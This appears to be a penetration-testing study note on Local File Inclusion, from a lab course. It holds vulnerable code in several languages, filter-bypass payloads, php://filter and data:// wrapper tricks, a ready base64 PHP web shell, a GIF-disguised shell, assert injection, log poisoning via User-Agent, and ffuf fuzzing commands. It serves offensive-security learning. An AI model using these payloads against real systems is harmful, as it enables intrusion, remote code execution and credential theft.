**Local File Inclusion (LFI)** is a type of security vulnerability that can occur in web applications. When a web application *doesn't properly validate user input or sanitize user-supplied data*, an attacker can exploit this vulnerability to include files on the local file system.

Also Called As :-
- Path Traversal Attack
- Dot-Dot-Slash
- Back Tracking

![[Pasted image 20230330100456.png]]


# Vulnerable Code
- **PHP**
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

- **NodeJS**
```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

- **Java**
```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

The `import` function may also be used to render a local file or a URL, such as the following example :-
```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```


- **.NET**
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

Furthermore, the `@Html.Partial()` function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier :-
```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

Finally, the `include` function may be used to render local files or remote URLs, and may also execute the specified files as well :-
```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```


---

# File Structure
- Suppose this is a file structure of a web page
- We Are in DVWA Directory, We Wanna Go to **/etc/passwd**
- To go in the *previous directory* in Linux, we use **../**
- So We go back By 4 Steps to reach the **root(/)** directory & do /etc/passwd
![[Pasted image 20230402093428.png]]


##### Where To Look For LFI Vulnerability

![[Pasted image 20230402094539.png]]


##### LFI In Post Method

![[Pasted image 20230402094656.png]]

Also present in **JSON Requests**!


# Bypass Methods
#### URL Encoding
Some web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals. However, some of these filters may be *bypassed by URL encoding* our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function.
![[Pasted image 20230402135407.png]]

Note: Sometimes You'll Have To URL Encode Only The `/` & Sometimes You'll Have To Encode Both(`. & /`) Use [[Website Hacking/Tools/Burp Suite/Basics]] Decoder For Encoding Both Of Them & [URL Encode and Decode - Online (urlencoder.org)](https://www.urlencoder.org/) For Encoding Just `/`


###### **NULL Character (%00)** 

%%  Works For PHP Versions < 5.5   %%

Suppose The Back End Code is :-
```php
include($_GET['language'] . ".php");
```
In this case, if we try to read `/etc/passwd`, then the file included would be `/etc/passwd.php`, which does not exist.

To *Bypass* This, We use ***URL Encoding***. *High Level Languages* Like **PHP, Python** Can't Talk to the Hardware Directly.

**High Level Language(HLL) ----> O.S. ----> Hardware**

There Are *OS APIs* That Translate HLL Commands To Hardware Understandable Language. These *OS APIs* Are Made of *C/C++*.

In C, To Declare End Of a String, '\\0' Is Used.                               [URL Encoding Of Null Character : %00]
Ex: "Dhruv" ----> ['D','h','r','u','v','\\0']
Since C Supports *Null Characters*, We Can Use This To our Advantage!

Now, Enter `/etc/passwd%00.php`, This Will ***Ignore*** the `.php` & Bypass The Security Check!



##### **Approved Paths**
Some web applications may also use *Regular Expressions* to ensure that the file being included is under a specific path. For example, this web application may only accept paths that are under the `./languages`directory
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

To bypass this, we may use *path traversal and start our payload with the approved path*, and then use `../` to go back to the root directory and read the file we specify :-

[SERVER_IP] : [PORT]/index.php?language=**./languages/../../../../etc/passwd**



##### Path Truncation
In earlier versions of PHP, defined strings have a *maximum length of 4096 characters*, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and *any characters after the maximum length will be ignored*. Furthermore, PHP also used to *remove trailing slashes and single dots in path names*, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. **Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension.**

An example of such payload would be the following:
```url
?language=directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```



#### PHP Filters
PHP provides a number of miscellaneous *I/O streams* that *allow access to PHP's own input and output streams, the standard input, output and error file descriptors*, in-memory and disk-backed temporary file streams, and *filters that can manipulate other file resources as they are read* from and written to.

**PHP Filters** are a type of PHP wrappers, where we can *pass different types of input and have it filtered by the filter we specify*. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can *specify the stream we would like to apply the filter on (e.g. a local file)*, while the `read` parameter can *apply different filters on the input resource*, so we can use it to specify which filter we want to apply on our resource.

1) Perform [[FFUF]] To Check For Different *Available PHP Pages* On The Website
```shell
aaryan11x@htb[/htb]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```
We can further `scan them for other referenced PHP files.`


2) **Source Code Disclosure**
Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter.
```url
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=[php_page]
```
**Note:** No Need To Append `.php` At the end of the [php_page] cuz it's already appended!
![[Pasted image 20230402160548.png]]


3) Decode From Base64 & Analyze the php source code for sensitive information like credentials or database keys.
![[Pasted image 20230402160722.png]]
***Note: In CTF's Look For the PHP Source Code In Detail, You Might Find Some Links in Comments/href***


#### PHP Wrappers
The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.

1) To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your **install PHP version**. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files.
	Example :-
```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

2) Decode The Base64 String & Check If `allow_url_include` is **On**
```shell
aaryan11x@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O......4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
This option is *not enabled by default*, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack.

3) ***Remote Code Execution***
	Convert a Basic *PHP Web Shell* To Base64. Here's one Already :-
	`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=`
	If This Is **Successful**, Start Executing *cmd Commands* :-
	<mark style="background: #ABF7F7A6;">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=[command_name]</mark>

***Note : If your Command has spaces in it, URL Encode It while sending using CTRL+u in Burpsuite***


###### Expect
We may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to *directly run commands through URL streams*. Expect works very similarly to the web shells we've used earlier, *but you don't need to provide a web shell*, as it is designed to execute commands.
However, **expect** is an **external wrapper**, so it needs to be manually installed and enabled on the back-end server.
Check For It the same way you checked for `allow_url_include`
```shell
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
So, **Expect** is Enabled!

Example :-
```shell
aaryan11x@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Here, *id is your command*

---
### Assert Function Exploitation
Read this for more info about the attack: https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6

For example, PHP code might be designed to prevent directory traversal like so:
```php
assert("strpos('$file', '..') === false") or die("");
```
While this aims to stop traversal, it inadvertently creates a vector for code injection. To exploit this for reading file contents, an attacker could use:
```php
' and die(highlight_file('/etc/passwd')) or '
```
```php
' and die(system("ls"))or '
```

----
### Image Uploads
1) Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the *image magic bytes* at the beginning of the file content (e.g. `GIF8`), just in case the *upload form checks for both the extension and content type* as well.

```shell
aaryan11x@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

2) Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we *need to know the path to our uploaded file*. Check The *Source Code* For This. If Not In Source Code, You'll Have To *Brutforce For Directories*.
Example :-
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**Note:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path, as we learned in previous sections.

---
# Log Poisoning
Writing PHP code in a field we *control what gets logged into a log file*, and then include that log file to *execute the PHP code*.

##### Type 1: Server Log Poisoning
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's **User-Agent** header. As we can control the **User-Agent header** in our requests, we can use it to *poison the server logs*.

 `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

By default, `Apache` logs are located in `/var/log/apache2/access.log` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/access.log` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

![[Pasted image 20230403185400.png]]

As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the **User-Agent** header.

Modify the **User-Agent** header to `Apache Log Poisoning`
![[Pasted image 20230403185632.png]]

If The Above Works, Craft a *PHP Web Shell* & Enter It in the **User Agent Header**
```php
<?php system($_GET['cmd']);?>
```

![[Pasted image 20230403185818.png]]

Start ***Remote Code Execution*** With **&cmd=[command]**
![[Pasted image 20230403190006.png]]

Some Other Logs Where This Technique Will Work :-
-  `/var/log/vsftpd.log` ([FTP Log Poisoning](https://secnhack.in/ftp-log-poisoning-through-lfi/))
- `/var/log/auth.log` ([SSH Log Poisoning](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/))
-  `/var/log/mail` ([SMTP Log Poisoning](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/))
- `/var/log/httpd-access.log` (FreeBSD Log Poisoning)

---
# LFI2RCE via phpinfo()
https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo


---
# Important Files to read
```sh
# This file gives the command line argument of the current process which is running (May conatin passwords in CTF)
/proc/self/cmdline

# Points to the current directory (traverse files in the cwd)
/proc/self/cwd

# Check which users are allowed to login via SSH
/etc/ssh/sshd_config

# User web session information
/var/lib/php/sessions/sess_<php session id>
```

---
# Automated Scanning
-  **Fuzzing Parameters**
```shell
ffuf -w /usr/share/secLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287


language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```
For a more precise scan, we can limit our scan to the *most popular LFI parameters* found on this [link](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters).


- **LFI Wordlists**
Once You Find a Parameter, You Can Test For *Common LFI Vulnerabilities*.
[LFI Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

```shell
aaryan11x@htb[/htb]$ ffuf -w /usr/share/secLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?[paramter]=FUZZ' -fs 2287


..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```


- **Server Webroot**
If we wanted to *locate a file we uploaded*, but we cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we may need to figure out the *server webroot path* so that we can locate our uploaded files through absolute paths instead of relative paths.
To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a *few back directories* (e.g. `../../../../`), and then add our `index.php` afterwords.

```shell
aaryan11x@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```


- **Server Logs/Configurations**
If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) Rather Than *LFI-Jhaddix.txt*
```shell
aaryan11x@htb[/htb]$ ffuf -w ./LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287


/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```


- **Multiple Fuzzing**
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZ2 -u "http://192.168.1.105/admin/admin.php?FUZZ=FUZ2" -ic -c
```